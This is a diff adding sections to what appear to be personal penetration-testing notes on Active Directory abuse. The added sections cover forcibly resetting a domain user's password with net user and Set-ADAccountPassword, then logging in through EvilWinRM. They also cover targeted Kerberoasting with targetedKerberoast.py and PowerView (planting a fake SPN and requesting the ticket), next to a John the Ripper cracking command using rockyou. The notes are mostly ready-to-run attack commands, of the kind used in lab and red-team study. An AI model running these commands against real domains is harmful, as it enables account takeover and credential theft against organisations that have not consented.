@@ -10,6 +10,21 @@
 
 - **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.
 
+## Reset Password
+
+```
+net user [user]"pass123!" /domain
+```
+
+or
+
+```powershell
+$SecPassword = ConvertTo-SecureString "pass123!" -AsPlainText -Force Set-ADAccountPassword -Identity "Michael" -NewPassword $SecPassword -Reset
+```
+
+EvilwinRM into their new creds
+
+---
 ## Abuse the `Account Operators` permissions
 
 Add an account into this vulnerable group using `GenericAll` to progress to the next step
@@ -164,6 +179,40 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+
+---
+
+### Kerberoasting (T1558.003)
+
+This abuse can be carried out when controlling an object that has a [**GenericAll**](https://hackingarticles.in/abusing-ad-dacl-generic-all-permissions/), **GenericWrite**, **WriteProperty** or **Validated-SPN** over the target.
+
+**Linux Python Script – TargetedKerberoast**
+
+From UNIX-like systems, this can be done with [**targetedKerberoast.py**](https://github.com/ShutdownRepo/targetedKerberoast) (Python).
+
+Further, with the help of John the Ripper end the dictionary such as Rock You can help the attacker to brute force the weak password.
+
+./targetedKerberoast.py --dc-ip '192.168.1.7' -v -d 'ignite.local' -u 'radha' -p 'Password@1'
+
+![GenericWrite Active Directory Abuse](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgzCvkq1G1w_LhrqeokVxc7iQgg0wykE2kBY-kP0IaOcI7gFlx62isK0UR0BxCaZZqjET0q-K2-j8j3dDuhMaurqFNfiG64MWV89lZ3NcP8zN_X6JFueZA26baP120Eo3VJOGiPwRZkl72fgqs5-sNlT-jY9nCYPy3LOKemFVsPQAlUdobnC9rDLTJdhYf4/s16000/24.png)
+
+### Windows PowerShell – Powerview
+
+From Windows machines, this can be achieved with **Set-DomainObject** and **Get-DomainSPNTicket** ([**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).
+
+powershell -ep bypass
+
+Import-Module .PowerView.ps1
+
+Set-DomainObject -Identity 'krishna' -Set @{serviceprincipalname='nonexistent/hacking'}
+
+Get-DomainUser 'krishna' | Select serviceprincipalname
+
+$User = Get-DomainUser 'krishna'
+
+$User | Get-DomainSPNTicket
+
+![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhH_6UYBUJu91tHDejyjI0Y-J4RAIY6R-YyddXdO2WIfIjyP6NWlwlNDmbydnY6ZGa24ua0qvPgLein3MEACSE1t_r59W8iDuHI7hkUFJW089owzltfbP6H3v3s3eWjTxEbU3aAGtksoKHN9k4eAo-BuZda9BUV5zosc_MM1b2stkxEVYN0U6WU90yX8G-T/s16000/25.png)
 
 ---
 
